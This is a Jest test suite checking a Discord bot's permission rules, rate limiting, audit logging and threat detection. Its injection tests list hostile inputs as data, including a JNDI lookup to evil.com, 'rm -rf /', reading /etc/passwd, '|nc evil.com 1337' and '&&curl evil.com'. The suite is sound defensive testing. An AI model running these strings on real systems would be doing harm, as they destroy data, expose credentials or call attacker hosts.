/**
 * Comprehensive Security Tests for Discord Bot Integration
 * Tests permission validation and anti-abuse measures
 */

const { jest } = require('@jest/globals');
const { MongoMemoryServer } = require('mongodb-memory-server');
const mongoose = require('mongoose');

// Import mock Discord client
const { MockDiscordClient } = require('./mockDiscordClient');

// Mock logger
jest.mock('../src/utils/logger', () => ({
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
    security: jest.fn(),
    audit: jest.fn()
}));

// Import services
const DiscordBotService = require('../src/services/discordBotService');
const DatabaseService = require('../src/services/databaseService');
const RedisService = require('../src/services/redisService');
const PermissionManager = require('../src/services/permissionManager');
const SecurityMonitor = require('../src/services/securityMonitor');
const AuditLogger = require('../src/services/auditLogger');
const SecurityReporter = require('../src/services/securityReporter');
const CommandHandler = require('../src/handlers/commandHandler');
const ButtonHandler = require('../src/handlers/buttonHandler');
const RateLimiter = require('../src/utils/rateLimiter');

describe('Discord Bot Security Tests', () => {
    let mongoServer;
    let mockClient;
    let databaseService;
    let redisService;
    let botService;
    let permissionManager;
    let securityMonitor;
    let auditLogger;
    let securityReporter;
    let commandHandler;
    let buttonHandler;
    let rateLimiter;

    beforeAll(async () => {
        // Start in-memory MongoDB
        mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        process.env.MONGODB_URI = mongoUri;
        process.env.REDIS_URL = 'redis://localhost:6379';
        process.env.NAFFLES_API_BASE_URL = 'https://api.test.naffles.com';
        process.env.NAFFLES_API_KEY = 'test-api-key';
        process.env.DISCORD_BOT_TOKEN = 'test-bot-token';
        process.env.DISCORD_CLIENT_ID = 'test-client-id';
    });

    afterAll(async () => {
        if (mongoServer) {
            await mongoServer.stop();
        }
        await mongoose.disconnect();
    });

    beforeEach(async () => {
        // Clear all mocks
        jest.clearAllMocks();

        // Create mock Discord client
        mockClient = new MockDiscordClient();

        // Initialize services
        databaseService = new DatabaseService();
        redisService = new RedisService();

        // Mock Redis connection
        redisService.connect = jest.fn().mockResolvedValue();
        redisService.disconnect = jest.fn().mockResolvedValue();
        redisService.isConnected = jest.fn(() => true);
        redisService.ping = jest.fn().mockResolvedValue('PONG');
        redisService.get = jest.fn().mockResolvedValue(null);
        redisService.set = jest.fn().mockResolvedValue('OK');
        redisService.del = jest.fn().mockResolvedValue(1);
        redisService.incr = jest.fn().mockResolvedValue(1);
        redisService.expire = jest.fn().mockResolvedValue(1);

        // Connect to test database
        await databaseService.connect();
        await redisService.connect();

        // Initialize bot service
        botService = new DiscordBotService(mockClient, databaseService, redisService);
        await botService.initialize();

        // Initialize security services
        permissionManager = new PermissionManager(botService);
        securityMonitor = new SecurityMonitor(botService);
        auditLogger = new AuditLogger(botService);
        securityReporter = new SecurityReporter(botService);
        rateLimiter = new RateLimiter(redisService);

        // Initialize handlers
        commandHandler = new CommandHandler(botService);
        buttonHandler = new ButtonHandler(botService);

        // Set up mock guild with various user types
        const mockGuild = mockClient.addMockGuild({
            id: '123456789',
            name: 'Test Guild',
            ownerId: 'owner123',
            memberCount: 100,
            channels: [
                { id: 'channel123', name: 'general', type: 0 }
            ],
            members: [
                {
                    user: { 
                        id: 'owner123', 
                        username: 'GuildOwner', 
                        discriminator: '0001',
                        bot: false,
                        createdTimestamp: Date.now() - (365 * 24 * 60 * 60 * 1000) // 1 year old
                    },
                    roles: ['admin-role']
                },
                {
                    user: { 
                        id: 'admin123', 
                        username: 'AdminUser', 
                        discriminator: '0002',
                        bot: false,
                        createdTimestamp: Date.now() - (180 * 24 * 60 * 60 * 1000) // 6 months old
                    },
                    roles: ['admin-role']
                },
                {
                    user: { 
                        id: 'user123', 
                        username: 'RegularUser', 
                        discriminator: '1234',
                        bot: false,
                        createdTimestamp: Date.now() - (30 * 24 * 60 * 60 * 1000) // 30 days old
                    },
                    roles: []
                },
                {
                    user: { 
                        id: 'newuser123', 
                        username: 'NewUser', 
                        discriminator: '5678',
                        bot: false,
                        createdTimestamp: Date.now() - (2 * 24 * 60 * 60 * 1000) // 2 days old
                    },
                    roles: []
                },
                {
                    user: { 
                        id: 'bot123', 
                        username: 'TestBot', 
                        discriminator: '0000',
                        bot: true,
                        createdTimestamp: Date.now() - (100 * 24 * 60 * 60 * 1000)
                    },
                    roles: []
                }
            ]
        });

        // Add admin role with permissions
        const adminRole = mockGuild.roles.cache.get('admin-role') || {
            id: 'admin-role',
            name: 'Admin',
            permissions: ['Administrator', 'ManageGuild', 'ManageChannels']
        };
        mockGuild.roles.cache.set('admin-role', adminRole);

        // Create server community mapping
        await databaseService.createServerCommunityMapping({
            serverId: '123456789',
            communityId: 'community123',
            linkedBy: 'owner123'
        });
    });

    afterEach(async () => {
        // Clean up database
        if (mongoose.connection.readyState === 1) {
            const collections = await mongoose.connection.db.collections();
            for (const collection of collections) {
                await collection.deleteMany({});
            }
        }

        // Reset mock client
        mockClient.reset();

        // Disconnect services
        await databaseService.disconnect();
        await redisService.disconnect();
    });

    describe('Permission Validation', () => {
        test('should allow guild owner to use all commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('owner123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('owner123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-create-task'
            );

            expect(result.allowed).toBe(true);
            expect(result.reason).toBeUndefined();
        });

        test('should allow admin users to use regular commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('admin123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('admin123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-create-task'
            );

            expect(result.allowed).toBe(true);
        });

        test('should allow regular users to use basic commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-list-tasks'
            );

            expect(result.allowed).toBe(true);
        });

        test('should deny bot accounts from using commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('bot123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('bot123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-create-task'
            );

            expect(result.allowed).toBe(false);
            expect(result.reason).toBe('Bots cannot use commands');
        });

        test('should deny new accounts from using commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('newuser123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('newuser123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-create-task'
            );

            expect(result.allowed).toBe(false);
            expect(result.reason).toBe('Account must be at least 7 days old to use commands');
        });

        test('should deny regular users from using admin commands', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            const result = await permissionManager.checkCommandPermission(
                mockInteraction, 
                'naffles-security'
            );

            expect(result.allowed).toBe(false);
            expect(result.reason).toBe('This command requires administrator permissions');
        });

        test('should validate community linking permissions', async () => {
            // Only guild owner should be able to link communities
            const ownerInteraction = {
                user: mockClient.users.cache.get('owner123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('owner123')
            };

            const ownerResult = await permissionManager.checkCommunityLinkingPermission(ownerInteraction);
            expect(ownerResult.allowed).toBe(true);

            // Admin should not be able to link communities
            const adminInteraction = {
                user: mockClient.users.cache.get('admin123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('admin123')
            };

            const adminResult = await permissionManager.checkCommunityLinkingPermission(adminInteraction);
            expect(adminResult.allowed).toBe(false);
            expect(adminResult.reason).toBe('Only the server owner can link communities');
        });

        test('should validate permissions for different command types', async () => {
            const regularUser = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            // Test different command permission levels
            const commands = [
                { name: 'naffles-list-tasks', expectedAllowed: true },
                { name: 'naffles-create-task', expectedAllowed: true },
                { name: 'naffles-connect-allowlist', expectedAllowed: true },
                { name: 'naffles-security', expectedAllowed: false },
                { name: 'naffles-link-community', expectedAllowed: false }
            ];

            for (const command of commands) {
                const result = await permissionManager.checkCommandPermission(
                    regularUser, 
                    command.name
                );
                expect(result.allowed).toBe(command.expectedAllowed);
            }
        });
    });

    describe('Rate Limiting and Anti-Abuse', () => {
        test('should enforce rate limits on commands', async () => {
            const userId = 'user123';
            const guildId = '123456789';
            const key = `command_rate_limit:${userId}:${guildId}`;

            // First command should be allowed
            const result1 = await rateLimiter.checkRateLimit(key, 5, 60); // 5 per minute
            expect(result1.allowed).toBe(true);
            expect(result1.remaining).toBe(4);

            // Simulate multiple rapid commands
            for (let i = 0; i < 4; i++) {
                await rateLimiter.checkRateLimit(key, 5, 60);
            }

            // 6th command should be rate limited
            const result6 = await rateLimiter.checkRateLimit(key, 5, 60);
            expect(result6.allowed).toBe(false);
            expect(result6.remaining).toBe(0);
            expect(result6.resetTime).toBeDefined();
        });

        test('should detect rapid command usage patterns', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                commandName: 'naffles-create-task'
            };

            // Simulate rapid command usage
            for (let i = 0; i < 12; i++) {
                await securityMonitor.monitorCommandExecution(mockInteraction, 'success');
            }

            // Should detect rapid commands
            const events = securityMonitor.getRecentSecurityEvents(10);
            const rapidCommandEvent = events.find(e => e.type === 'rapid_commands');
            expect(rapidCommandEvent).toBeDefined();
            expect(rapidCommandEvent.severity).toBe('medium');
            expect(rapidCommandEvent.userId).toBe('user123');
        });

        test('should detect suspicious button clicking patterns', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                customId: 'task_complete_task123'
            };

            // Simulate rapid button clicks
            for (let i = 0; i < 15; i++) {
                await securityMonitor.monitorButtonInteraction(mockInteraction);
            }

            const events = securityMonitor.getRecentSecurityEvents(10);
            const rapidButtonEvent = events.find(e => e.type === 'rapid_buttons');
            expect(rapidButtonEvent).toBeDefined();
            expect(rapidButtonEvent.severity).toBe('medium');
        });

        test('should detect mass member join attacks', async () => {
            const guildId = '123456789';

            // Simulate mass joins
            for (let i = 0; i < 15; i++) {
                const mockMember = {
                    user: {
                        id: `mass-join-${i}`,
                        tag: `MassJoin${i}#1234`,
                        createdTimestamp: Date.now() - (1 * 24 * 60 * 60 * 1000) // 1 day old
                    },
                    guild: { id: guildId }
                };

                await securityMonitor.monitorMemberJoin(mockMember);
            }

            const events = securityMonitor.getRecentSecurityEvents(10);
            const massJoinEvent = events.find(e => e.type === 'mass_joins');
            expect(massJoinEvent).toBeDefined();
            expect(massJoinEvent.severity).toBe('high');
        });

        test('should detect suspicious new account activity', async () => {
            // Create very new account (1 hour old)
            const suspiciousUser = mockClient.addMockUser({
                id: 'suspicious123',
                username: 'SuspiciousUser',
                discriminator: '9999',
                createdTimestamp: Date.now() - (1 * 60 * 60 * 1000) // 1 hour old
            });

            const mockInteraction = {
                user: suspiciousUser,
                guildId: '123456789',
                commandName: 'naffles-create-task'
            };

            await securityMonitor.monitorCommandExecution(mockInteraction, 'success');

            const events = securityMonitor.getRecentSecurityEvents(10);
            const newAccountEvent = events.find(e => e.type === 'new_account_activity');
            expect(newAccountEvent).toBeDefined();
            expect(newAccountEvent.severity).toBe('low');
        });

        test('should implement progressive rate limiting', async () => {
            const userId = 'progressive123';
            const guildId = '123456789';

            // First violation - warning
            for (let i = 0; i < 6; i++) {
                await rateLimiter.checkRateLimit(`command:${userId}:${guildId}`, 5, 60);
            }

            let violations = await rateLimiter.getViolationCount(userId);
            expect(violations).toBe(1);

            // Second violation - temporary restriction
            for (let i = 0; i < 6; i++) {
                await rateLimiter.checkRateLimit(`command:${userId}:${guildId}`, 5, 60);
            }

            violations = await rateLimiter.getViolationCount(userId);
            expect(violations).toBe(2);

            // Check if user is temporarily restricted
            const isRestricted = await rateLimiter.isUserRestricted(userId);
            expect(isRestricted).toBe(true);
        });
    });

    describe('Input Validation and Sanitization', () => {
        test('should validate command input parameters', async () => {
            const mockInteraction = mockClient.simulateInteractionCreate({
                commandName: 'naffles-create-task',
                guildId: '123456789',
                user: mockClient.users.cache.get('user123'),
                options: {
                    type: 'invalid_type', // Invalid task type
                    title: 'A'.repeat(200), // Too long
                    description: '', // Empty
                    points: -10 // Negative
                }
            });

            await commandHandler.handleSlashCommand(mockInteraction);

            expect(mockInteraction.reply).toHaveBeenCalledWith(
                expect.objectContaining({
                    content: expect.stringContaining('Invalid'),
                    ephemeral: true
                })
            );
        });

        test('should sanitize user input to prevent injection attacks', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                '${jndi:ldap://evil.com/a}',
                'DROP TABLE users;',
                '../../etc/passwd',
                '{{constructor.constructor("return process")().exit()}}'
            ];

            for (const maliciousInput of maliciousInputs) {
                const mockInteraction = mockClient.simulateInteractionCreate({
                    commandName: 'naffles-create-task',
                    guildId: '123456789',
                    user: mockClient.users.cache.get('user123'),
                    options: {
                        type: 'twitter_follow',
                        title: maliciousInput,
                        description: 'Test description',
                        points: 100
                    }
                });

                await commandHandler.handleSlashCommand(mockInteraction);

                // Should either reject or sanitize the input
                expect(mockInteraction.reply || mockInteraction.editReply).toHaveBeenCalled();
            }
        });

        test('should validate Discord IDs and prevent ID spoofing', async () => {
            const invalidIds = [
                'not-a-snowflake',
                '123', // Too short
                'a'.repeat(30), // Too long
                '0', // Invalid
                '-123456789', // Negative
                '1.23e10' // Scientific notation
            ];

            for (const invalidId of invalidIds) {
                const result = botService.validateDiscordId(invalidId);
                expect(result).toBe(false);
            }

            // Valid Discord ID
            const validId = '123456789012345678';
            const validResult = botService.validateDiscordId(validId);
            expect(validResult).toBe(true);
        });

        test('should prevent command injection in custom IDs', async () => {
            const maliciousCustomIds = [
                'task_complete_; rm -rf /',
                'task_complete_$(whoami)',
                'task_complete_`cat /etc/passwd`',
                'task_complete_|nc evil.com 1337',
                'task_complete_&&curl evil.com'
            ];

            for (const customId of maliciousCustomIds) {
                const mockInteraction = mockClient.simulateInteractionCreate({
                    type: 3,
                    customId,
                    guildId: '123456789',
                    user: mockClient.users.cache.get('user123')
                });

                await buttonHandler.handleButtonInteraction(mockInteraction);

                // Should reject malicious custom IDs
                expect(mockInteraction.reply).toHaveBeenCalledWith(
                    expect.objectContaining({
                        content: expect.stringContaining('Invalid'),
                        ephemeral: true
                    })
                );
            }
        });
    });

    describe('Audit Logging and Monitoring', () => {
        test('should log all command executions', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                guild: { name: 'Test Guild' },
                channelId: 'channel123',
                commandName: 'naffles-create-task',
                options: { data: [] },
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            await auditLogger.logCommandExecution(mockInteraction, 'success');

            expect(auditLogger.auditLogs).toHaveLength(1);
            const log = auditLogger.auditLogs[0];
            expect(log.type).toBe('command_executed');
            expect(log.userId).toBe('user123');
            expect(log.guildId).toBe('123456789');
            expect(log.commandName).toBe('naffles-create-task');
            expect(log.success).toBe(true);
        });

        test('should log permission checks', async () => {
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId: '123456789',
                guild: { name: 'Test Guild' },
                commandName: 'naffles-create-task',
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            await auditLogger.logPermissionCheck(mockInteraction, 'granted', 'Permission granted');

            expect(auditLogger.auditLogs).toHaveLength(1);
            const log = auditLogger.auditLogs[0];
            expect(log.type).toBe('permission_granted');
            expect(log.userId).toBe('user123');
            expect(log.details.reason).toBe('Permission granted');
        });

        test('should log security events', async () => {
            const securityEvent = {
                type: 'rapid_commands',
                severity: 'medium',
                userId: 'user123',
                guildId: '123456789',
                details: { commandCount: 12, timeWindow: 60 }
            };

            await auditLogger.logSecurityEvent(securityEvent);

            expect(auditLogger.auditLogs).toHaveLength(1);
            const log = auditLogger.auditLogs[0];
            expect(log.type).toBe('security_event');
            expect(log.details.eventType).toBe('rapid_commands');
            expect(log.details.severity).toBe('medium');
        });

        test('should generate comprehensive audit reports', () => {
            // Add various log entries
            const logs = [
                { type: 'command_executed', userId: 'user1', success: true },
                { type: 'command_executed', userId: 'user2', success: false },
                { type: 'permission_denied', userId: 'user3' },
                { type: 'security_event', details: { eventType: 'rapid_commands' } }
            ];

            logs.forEach(log => auditLogger.auditLogs.push({
                ...log,
                timestamp: new Date(),
                id: Math.random().toString(36)
            }));

            const stats = auditLogger.getAuditStatistics();
            expect(stats.totalLogs).toBe(4);
            expect(stats.logsByType.command_executed).toBe(2);
            expect(stats.logsByType.permission_denied).toBe(1);
            expect(stats.logsByType.security_event).toBe(1);
        });
    });

    describe('Security Reporting and Alerting', () => {
        test('should generate security reports', async () => {
            // Add mock security data
            securityMonitor.securityEvents = [
                {
                    type: 'rapid_commands',
                    severity: 'medium',
                    userId: 'user123',
                    guildId: '123456789',
                    timestamp: Date.now()
                },
                {
                    type: 'mass_joins',
                    severity: 'high',
                    guildId: '123456789',
                    timestamp: Date.now()
                }
            ];

            auditLogger.auditLogs = [
                {
                    type: 'command_executed',
                    userId: 'user123',
                    success: true,
                    timestamp: new Date()
                },
                {
                    type: 'permission_denied',
                    userId: 'user456',
                    timestamp: new Date()
                }
            ];

            const report = await securityReporter.generateSecurityReport('day', '123456789');

            expect(report).toBeDefined();
            expect(report.summary).toBeDefined();
            expect(report.threatAnalysis).toBeDefined();
            expect(report.recommendations).toBeDefined();
            expect(report.summary.totalEvents).toBe(2);
            expect(report.summary.highSeverityEvents).toBe(1);
        });

        test('should format security alerts properly', () => {
            const alert = {
                type: 'rapid_commands',
                severity: 'medium',
                userId: 'user123',
                guildId: '123456789',
                description: 'User executing commands too rapidly',
                details: { commandCount: 12, timeWindow: 60 }
            };

            const embed = securityReporter.formatSecurityAlert(alert);
            expect(embed).toBeDefined();
            // Verify embed structure would be created properly
        });

        test('should configure alert channels', () => {
            const guildId = '123456789';
            const channelId = 'security-channel-123';

            securityReporter.setAlertChannel(guildId, channelId);
            expect(securityReporter.alertChannels.get(guildId)).toBe(channelId);

            securityReporter.removeAlertChannel(guildId);
            expect(securityReporter.alertChannels.has(guildId)).toBe(false);
        });

        test('should escalate high-severity events', async () => {
            const highSeverityEvent = {
                type: 'mass_joins',
                severity: 'high',
                guildId: '123456789',
                description: 'Potential raid detected',
                details: { joinCount: 20, timeWindow: 300 }
            };

            await securityMonitor.processSecurityEvent(highSeverityEvent);

            // Should trigger immediate alert for high severity
            expect(securityMonitor.alertQueue).toContain(
                expect.objectContaining({
                    severity: 'high',
                    type: 'mass_joins'
                })
            );
        });
    });

    describe('Data Protection and Privacy', () => {
        test('should not log sensitive user data', async () => {
            const mockInteraction = {
                user: {
                    id: 'user123',
                    tag: 'TestUser#1234',
                    email: 'sensitive@email.com', // Should not be logged
                    phone: '+1234567890' // Should not be logged
                },
                guildId: '123456789',
                guild: { name: 'Test Guild' },
                commandName: 'naffles-create-task',
                options: {
                    password: 'secret123', // Should not be logged
                    apiKey: 'sk-1234567890' // Should not be logged
                },
                member: mockClient.guilds.cache.get('123456789').members.cache.get('user123')
            };

            await auditLogger.logCommandExecution(mockInteraction, 'success');

            const log = auditLogger.auditLogs[0];
            expect(log.details).not.toHaveProperty('email');
            expect(log.details).not.toHaveProperty('phone');
            expect(log.details).not.toHaveProperty('password');
            expect(log.details).not.toHaveProperty('apiKey');
        });

        test('should sanitize logs before storage', () => {
            const sensitiveData = {
                userId: 'user123',
                password: 'secret123',
                token: 'bearer-token-123',
                email: 'user@example.com',
                ip: '192.168.1.1'
            };

            const sanitized = auditLogger.sanitizeLogData(sensitiveData);

            expect(sanitized.userId).toBe('user123');
            expect(sanitized.password).toBe('[REDACTED]');
            expect(sanitized.token).toBe('[REDACTED]');
            expect(sanitized.email).toBe('[REDACTED]');
            expect(sanitized.ip).toBe('[REDACTED]');
        });

        test('should implement data retention policies', async () => {
            // Add old logs
            const oldDate = new Date(Date.now() - 91 * 24 * 60 * 60 * 1000); // 91 days ago
            
            auditLogger.auditLogs.push({
                id: 'old-log-1',
                type: 'command_executed',
                userId: 'user123',
                timestamp: oldDate
            });

            auditLogger.auditLogs.push({
                id: 'recent-log-1',
                type: 'command_executed',
                userId: 'user123',
                timestamp: new Date()
            });

            // Clean up old logs (90 day retention)
            const cleanedCount = await auditLogger.cleanupOldLogs(90);
            expect(cleanedCount).toBe(1);
            expect(auditLogger.auditLogs).toHaveLength(1);
            expect(auditLogger.auditLogs[0].id).toBe('recent-log-1');
        });
    });

    describe('Threat Detection and Response', () => {
        test('should detect coordinated attacks', async () => {
            const attackerIps = ['192.168.1.100', '192.168.1.101', '192.168.1.102'];
            const targetGuild = '123456789';

            // Simulate coordinated attack from multiple IPs
            for (let i = 0; i < attackerIps.length; i++) {
                for (let j = 0; j < 5; j++) {
                    const mockInteraction = {
                        user: { id: `attacker-${i}-${j}` },
                        guildId: targetGuild,
                        commandName: 'naffles-create-task',
                        ip: attackerIps[i]
                    };

                    await securityMonitor.monitorCommandExecution(mockInteraction, 'failed');
                }
            }

            const events = securityMonitor.getRecentSecurityEvents(20);
            const coordinatedAttack = events.find(e => e.type === 'coordinated_attack');
            expect(coordinatedAttack).toBeDefined();
            expect(coordinatedAttack.severity).toBe('critical');
        });

        test('should implement automatic response to threats', async () => {
            const suspiciousUser = 'attacker123';
            const guildId = '123456789';

            // Trigger multiple security violations
            for (let i = 0; i < 10; i++) {
                await securityMonitor.recordSecurityViolation(suspiciousUser, 'rapid_commands');
            }

            // Should automatically restrict user
            const isRestricted = await securityMonitor.isUserRestricted(suspiciousUser);
            expect(isRestricted).toBe(true);

            // Should create security event
            const events = securityMonitor.getRecentSecurityEvents(10);
            const autoRestriction = events.find(e => e.type === 'auto_restriction');
            expect(autoRestriction).toBeDefined();
            expect(autoRestriction.userId).toBe(suspiciousUser);
        });

        test('should quarantine suspicious messages', async () => {
            const suspiciousContent = [
                'Join my server for free nitro: discord.gg/scam',
                'Click here to claim your prize: http://phishing-site.com',
                'Send me your password and I\'ll give you admin',
                '@everyone FREE DISCORD NITRO GENERATOR'
            ];

            for (const content of suspiciousContent) {
                const isSuspicious = await securityMonitor.analyzeSuspiciousContent(content);
                expect(isSuspicious).toBe(true);
            }

            // Legitimate content should not be flagged
            const legitimateContent = 'Welcome to our community! Please read the rules.';
            const isLegitimate = await securityMonitor.analyzeSuspiciousContent(legitimateContent);
            expect(isLegitimate).toBe(false);
        });

        test('should implement emergency lockdown procedures', async () => {
            const guildId = '123456789';
            
            // Trigger emergency lockdown
            await securityMonitor.triggerEmergencyLockdown(guildId, 'mass_raid_detected');

            // Verify lockdown is active
            const isLocked = await securityMonitor.isGuildLocked(guildId);
            expect(isLocked).toBe(true);

            // All commands should be blocked during lockdown
            const mockInteraction = {
                user: mockClient.users.cache.get('user123'),
                guildId,
                commandName: 'naffles-create-task'
            };

            const result = await permissionManager.checkCommandPermission(mockInteraction, 'naffles-create-task');
            expect(result.allowed).toBe(false);
            expect(result.reason).toBe('Guild is under emergency lockdown');
        });
    });

    describe('Security Configuration and Hardening', () => {
        test('should validate security configuration', () => {
            const config = securityMonitor.getSecurityConfiguration();
            
            expect(config.rateLimits).toBeDefined();
            expect(config.alertThresholds).toBeDefined();
            expect(config.autoRestrictions).toBeDefined();
            expect(config.dataRetention).toBeDefined();

            // Verify secure defaults
            expect(config.rateLimits.commands.perMinute).toBeLessThanOrEqual(10);
            expect(config.alertThresholds.rapidCommands).toBeLessThanOrEqual(10);
            expect(config.dataRetention.auditLogs).toBeLessThanOrEqual(90);
        });

        test('should update security configuration safely', () => {
            const newConfig = {
                rateLimits: {
                    commands: { perMinute: 5 }, // More restrictive
                    buttons: { perMinute: 10 }
                },
                alertThresholds: {
                    rapidCommands: 8,
                    massJoins: 15
                }
            };

            securityMonitor.updateSecurityConfiguration(newConfig);
            
            const updatedConfig = securityMonitor.getSecurityConfiguration();
            expect(updatedConfig.rateLimits.commands.perMinute).toBe(5);
            expect(updatedConfig.alertThresholds.rapidCommands).toBe(8);
        });

        test('should validate environment security', () => {
            const securityCheck = botService.performSecurityCheck();
            
            expect(securityCheck.tokenSecurity).toBe(true);
            expect(securityCheck.permissionsValid).toBe(true);
            expect(securityCheck.rateLimitingEnabled).toBe(true);
            expect(securityCheck.auditingEnabled).toBe(true);
            expect(securityCheck.encryptionEnabled).toBe(true);
        });
    });
});